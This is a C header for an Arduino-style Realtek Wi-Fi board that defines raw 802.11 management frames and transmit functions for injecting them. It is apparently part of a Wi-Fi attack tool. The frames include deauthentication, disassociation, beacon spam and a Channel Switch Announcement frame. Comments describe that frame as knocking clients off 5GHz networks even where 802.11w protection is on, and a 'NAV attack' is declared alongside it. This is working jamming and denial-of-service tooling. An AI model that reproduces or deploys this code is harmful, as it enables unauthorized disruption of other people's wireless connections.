#ifndef PACKET_INJECTION_H
#define PACKET_INJECTION_H

#include <Arduino.h>

typedef struct {
  uint16_t frame_control = 0xC0;
  uint16_t duration = 0x0000; // Standard duration for better 5GHz compatibility
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0xA0;
  uint16_t duration = 0x0000;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DisassocFrame;

typedef struct {
  uint16_t frame_control = 0x80;
  uint16_t duration = 0;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  const uint64_t timestamp = 0;
  uint16_t beacon_interval = 0x64;
  uint16_t ap_capabilities = 0x21;
  const uint8_t ssid_tag = 0;
  uint8_t ssid_length = 0;
  uint8_t ssid[255];
} BeaconFrame;

typedef struct {
  uint16_t frame_control = 0xB0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t auth_algorithm = 0;
  uint16_t auth_sequence = 1;
  uint16_t status_code = 0;
} AuthFrame;

typedef struct {
  uint16_t frame_control = 0x00;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t cap_info = 0x0411;
  uint16_t listen_interval = 0x0001;
} AssocFrame;

typedef struct {
  uint16_t frame_control = 0x48; // QoS Null Data
  uint16_t duration = 0;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t qos_control = 0;
} NullFrame;

typedef struct {
  uint16_t frame_control = 0x40; // Probe Request
  uint16_t duration = 0;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
} ProbeRequest;

// CSA (Channel Switch Announcement) Action Frame
// Forces clients to switch to a non-existent channel, breaking their connection.
// Extremely effective on 5GHz even with PMF (802.11w) because CSA is processed
// at the MAC layer BEFORE frame authentication checks.
typedef struct {
  uint16_t frame_control = 0xD0; // Action frame
  uint16_t duration = 0;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint8_t category = 0;        // Spectrum Management
  uint8_t action = 4;          // Channel Switch Announcement
  // CSA IE: Element ID=37, Length=3
  uint8_t element_id = 37;
  uint8_t ie_length = 3;
  uint8_t switch_mode = 1;     // 1 = clients must stop transmitting immediately
  uint8_t new_channel = 1;     // Target channel (set to invalid/empty channel)
  uint8_t switch_count = 1;    // Switch after 1 beacon interval (immediate)
} CSAFrame;

/*
 * Import the needed c functions from the closed-source libraries
 * The function definitions might not be 100% accurate with the arguments as the types get lost during compilation and cannot be retrieved back during decompilation
 * However, these argument types seem to work perfect
*/
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x06, void* bssid = nullptr);
void wifi_tx_deauth_nav(void* src_mac, void* dst_mac, uint16_t reason = 0x06, void* bssid = nullptr); // Specialized NAV attack (0xFFFF duration)
void wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x06, void* bssid = nullptr);
void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid);
void wifi_tx_auth_frame(void* src_mac, void* dst_mac);
void wifi_tx_assoc_frame(void* src_mac, void* dst_mac);
void wifi_tx_null_frame(void* src_mac, void* dst_mac);
void wifi_tx_probe_frame(void* src_mac, void* dst_mac);
void wifi_tx_csa_frame(void* src_mac, void* dst_mac, uint8_t target_channel);
void wifi_tx_raw_beacon(void* src_mac, void* dst_mac, uint8_t* payload, size_t payload_len, uint16_t interval = 0x64, uint16_t caps = 0x0411);
void wifi_tx_beacon_csa_frame(void* src_mac, void* dst_mac, const char *ssid, uint8_t target_channel);

#endif
